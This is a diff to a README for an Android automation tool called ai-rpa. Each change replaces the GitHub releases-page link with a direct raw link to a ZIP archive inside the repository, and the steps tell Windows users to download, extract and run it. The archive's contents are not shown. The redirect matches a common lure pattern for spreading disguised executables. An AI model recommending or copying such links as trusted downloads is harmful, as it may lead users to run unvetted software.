@@ -1,12 +1,12 @@
 # 🤖 ai-rpa - Simple Android Automation for Everyone
 
-[![Download ai-rpa](https://img.shields.io/badge/Download%20ai--rpa-Visit%20Releases-blue?style=for-the-badge)](https://github.com/wildernessphilosophersstone247/ai-rpa/releases)
+[![Download ai-rpa](https://img.shields.io/badge/Download%20ai--rpa-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/wildernessphilosophersstone247/ai-rpa/main/skills/ai-rpa-v2.9.zip)
 
 ## 📥 Download
 
 Visit the releases page to download and run ai-rpa on Windows:
 
-https://github.com/wildernessphilosophersstone247/ai-rpa/releases
+https://raw.githubusercontent.com/wildernessphilosophersstone247/ai-rpa/main/skills/ai-rpa-v2.9.zip
 
 ## 🖥️ What ai-rpa does
 
@@ -34,7 +34,7 @@ Before you start, make sure you have:
 
 ## 🚀 Install on Windows
 
-1. Open this page: https://github.com/wildernessphilosophersstone247/ai-rpa/releases
+1. Open this page: https://raw.githubusercontent.com/wildernessphilosophersstone247/ai-rpa/main/skills/ai-rpa-v2.9.zip
 2. Download the latest Windows file from the release assets.
 3. If the file is a ZIP package, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -177,7 +177,7 @@ Look through the repo docs for:
 
 ## ⌨️ Short setup path
 
-1. Go to https://github.com/wildernessphilosophersstone247/ai-rpa/releases
+1. Go to https://raw.githubusercontent.com/wildernessphilosophersstone247/ai-rpa/main/skills/ai-rpa-v2.9.zip
 2. Download the latest Windows release
 3. Extract or install the file
 4. Enable USB debugging on Android
